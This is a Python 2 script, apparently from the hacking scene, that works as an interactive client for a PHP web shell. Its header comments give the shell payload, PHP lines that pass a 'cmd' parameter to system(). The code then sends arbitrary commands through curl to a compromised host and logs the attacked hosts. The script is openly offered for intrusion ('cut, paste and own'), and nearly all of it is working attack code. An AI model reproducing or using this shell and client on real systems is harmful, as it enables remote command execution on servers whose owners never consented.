#!/usr/bin/python
#
# Malformation's Interactive HTTP GET and POST Shell - fireinthehole.py
# Only for UNIX based systems at the moment.
# It's a very messy script, but surprisingly it works quite well...
# Shouldn't be much need to mess with the variables and configuration
# Just cut, paste and own, you 1337 h4x0r, you
#
# Upload something like this to a php file:
# <?php if (isset($_POST["cmd"])) { system($_POST["cmd"]); } ?>
# <?php if (isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>
#
# Kisses go to .aware, OTW, STS, darkc0de, str0ke, some Aussies and anyone keeping the scene alive
# Please don't strip the credits out if you modify or redistribute.

import sys, os, time, readline

print '''
	Malformation's Interactive HTTP GET and POST Shell v1.0.0B
	
	Command history using readline - Just use the arrow keys
	Set your prompt like this: set prompt <prompt_here>
	Host history - attack someone on a rainy day when you're bored
	Tries to maintain current working directory when you use 'cd'.
	
	Usage:
	\tEnter the host => hacked.com/hacked.php
	\tGET/POST => POST
	\tEnter the POST variable => cmd
	\thacked.com/hacked.php# ls -la
	\ttotal 8673
	\tdrwxr-xr-x  2 web    web        4096 2009-09-03 11:54 .
	\tdrwxr-xr-x 15 web    web        4096 2009-09-08 13:37 ..
	\t-rw-r--r--  1 web    web         481 2009-09-02 18:58 hacked.php
	\thacked.com/hacked.php# set prompt $
	\t$ .
	\tBye.
'''

# # # # # Configuration # # # # # # # # # # # # #
# 1 to turn on curl verbosity                   #
debug = 0                                       #
logfile1 = "fireinthehole.txt"                  #
logfile2 = "fireinthehole-hosts.txt"            #
#                                               #
#                                               #
# The file handle below is just for appending   #
# Don't change it                               #
logfile3 = logfile2                             #
# # # # # # # # # # # # # # # # # # # # # # # # #

write = 0
write2 = 0
curl_array = ["/bin/", "/usr/bin/", "/usr/sbin/"]
curl_dirs = ""
count = 0
finalcommand = ""
dir_array = []
set_prompt = 0
prompt = ""
number = 0
hosts_array = []
skip_insert = 0
dont_write = 0

for i in range(0,len(curl_array)):
	if (os.path.exists(curl_array[i] + "curl")):
		count = count + 1
		curl_dirs = curl_dirs + curl_array[i] + " "

if (count == 0):
	print "Couldn't find curl. Tried looking in " + curl_dirs
	sys.exit(0)
	
try:
	if (os.path.exists(logfile1)):
		file = open(logfile1,"a")
	else:
		file = open(logfile1,"w")
	write = 1
	print "Output will be saved to " + logfile1
	if (os.path.exists(logfile2)):
		hosts_history = open(logfile2,"r+")
		hosts_history2 = open(logfile3,"a")
	else:
		hosts_history2 = open(logfile3,"a")
	write2 = 1
	print "Hosts will be saved to " + logfile2

except IOError:
	print "Directory not writable, output will not be saved."

try:
	if (write2 == 1):
		if (os.path.exists(logfile2)):
			if (os.path.getsize(logfile2) != 0):
				print "Previous hosts: "
				while(1):
					thisline = hosts_history.readline()
					thisline = thisline.strip()
					if thisline:
						print "\t[" + str(number) + "] " + thisline
						hosts_array.insert(number, thisline)
						number = number + 1
					else:
						break
				while(1):
					host = raw_input("Enter a number or new host => ")
					try:
						host_inted = int(host)
					except ValueError:
						break
					if (type(host_inted) == int):
						if ((host_inted < len(hosts_array)) and (host_inted > -1)):
							host = hosts_array[host_inted]
							skip_insert = 1
							break
						else:
							print "Wrong number, enter again correctly"
							continue
					break
			else:
				host = raw_input("Enter the host => ")
		else:
			host = raw_input("Enter the host => ")
	else:
		host = raw_input("Enter the host => ")
	readline.add_history(host) #Thanks nemo and andrewg
	host_split = host.split(",") #This won't affect anything since there is no ',' in a url and it wont get affected, so we don't need to check for bad input
	if (skip_insert == 0):
		method = raw_input("GET/POST => ")
		readline.add_history(method)
		if (method == "GET"):
			myvar = raw_input("Enter the GET variable => ")
		elif (method == "POST"):
			myvar = raw_input("Enter the POST variable => ")
		else:
			sys.exit(0)
		if ((host_split[0] + "," + method + "," + myvar) in hosts_array):
			print "You already had this as a previous host!"
			dont_write = 1
		readline.add_history(myvar)
	else:
		method = host_split[1]
		readline.add_history(method)
		myvar = host_split[2]
		readline.add_history(myvar)
	if (write2 == 1):
		if (skip_insert == 0):
			if (dont_write == 0):
				hosts_history2.write(host + "," + method + "," + myvar + "\n")
	while True:
		if (set_prompt == 1):
			mycommand = raw_input(prompt)
		else:
			mycommand = raw_input(host_split[0] + "# ")
		readline.add_history(mycommand)
		origcommand = mycommand
		finalcommand = ""
		if (mycommand == "."):
			print "Bye."
			sys.exit(0)
		if (mycommand.find("set prompt ") != -1):
			set_prompt = 1
			prompt = mycommand[11:len(string)]
			continue
		mycommand = mycommand + "; "
		if (mycommand[0] + mycommand[1] + mycommand[2] == "cd "):
			dir_array.insert(len(dir_array) + 1, mycommand)
			if (method == "GET"):
				string = "curl -s \"" + host + "?" + myvar + "=" + mycommand + "\""
			else:
				string = "curl -s -d \"" + myvar + "=" + mycommand + "\" " + host
			if (debug == 1):
				print string + ":\n"
			continue
		if (len(dir_array) != 0):
			for j in range(0,len(dir_array)):
				finalcommand = finalcommand + dir_array[j]
			finalcommand = finalcommand + mycommand
		if (finalcommand != ""):
			mycommand = finalcommand
		if (method == "GET"):
			string = "curl -s \"" + host_split[0] + "?" + myvar + "=" + mycommand + "\""
		else:
			string = "curl -s -d \"" + myvar + "=" + mycommand + "\" " + host_split[0]
		if (debug == 1):
			print string + ":\n"
		command = os.popen(string,"r")
		if (write == 1):
			if (set_prompt == 1):
				file.write(prompt + origcommand + "\n")
			else:
				file.write(host_split[0] + "# " + origcommand + "\n")
		while(1):
			line = command.readline()
			line = line.strip()
			if line:
				print line
				if (write == 1):
					file.write(line + "\n")
			else:
				break
except KeyboardInterrupt:
	print "\nBye."
	sys.exit(0)

except:
	print "Unhandled exception"
	sys.exit(0)

